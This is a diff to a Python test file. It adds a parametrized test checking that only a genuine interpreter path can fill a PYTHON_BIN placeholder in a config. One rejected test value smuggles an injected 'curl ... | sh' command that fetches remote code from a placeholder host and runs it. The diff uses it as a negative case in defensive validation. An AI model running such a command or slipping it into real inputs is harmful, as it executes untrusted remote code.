@@ -724,3 +724,27 @@ def test_a_rollback_names_the_files_it_kept(claude: Path) -> None:
     assert notes.read_text(encoding="utf-8") == "mine\n"
     messages = " ".join(str(w["message"]) for w in envelope["warnings"])
     assert "my-notes.md" in messages
+
+
+@pytest.mark.parametrize(
+    ("value", "matches"),
+    [
+        ("C:/Users/O'Brien/AppData/Local/Programs/Python/Python314/python.exe", True),
+        ("/usr/bin/python3", True),
+        ("/opt/my env (x)/~/caf\u00e9/python3.12", True),
+        ("python; curl https://example.invalid/x | sh; python", False),
+        ("pwsh -File C:/x.ps1", False),
+        ("plain prose a user wrote here", False),
+        ("/usr/bin/python3 # my note", False),
+    ],
+)
+def test_only_an_interpreter_path_fills_the_python_token(
+    tmp_path: Path, value: str, matches: bool
+) -> None:
+    from apothem.harnesses._shared.install_driver_expected import _filled
+
+    expected = b'"command": "${PYTHON_BIN} render.py"\n'
+    actual = tmp_path / "conformity.json"
+    actual.write_bytes(f'"command": "{value} render.py"\n'.encode())
+
+    assert _filled(expected, actual) is matches
